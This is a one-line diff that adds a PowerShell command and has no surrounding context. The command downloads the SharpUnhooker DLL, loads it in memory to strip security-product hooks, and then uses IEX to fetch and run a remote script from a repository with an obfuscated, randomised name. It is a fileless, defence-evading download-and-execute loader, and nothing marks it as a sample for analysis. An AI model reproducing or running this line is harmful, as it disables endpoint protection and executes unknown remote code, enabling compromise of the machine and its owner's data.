@@ -1,0 +1,1 @@
+$oUliJ = (iwr -UseBasicParsing "https://github.com/GetRektBoy724/SharpUnhooker/raw/main/SharpUnhooker.dll").Content;[System.Reflection.Assembly]::Load($oUliJ);[SharpUnhooker]::Main();IEX(iwr -usebasicparsing https://raw.githubusercontent.com/lIIlIIllIIIlIlIIlll/IllIIIlIlIIlllIllIIIlIlIIlllIllIIIlIlIIlll/main/EWfUaYQqA.ps1)
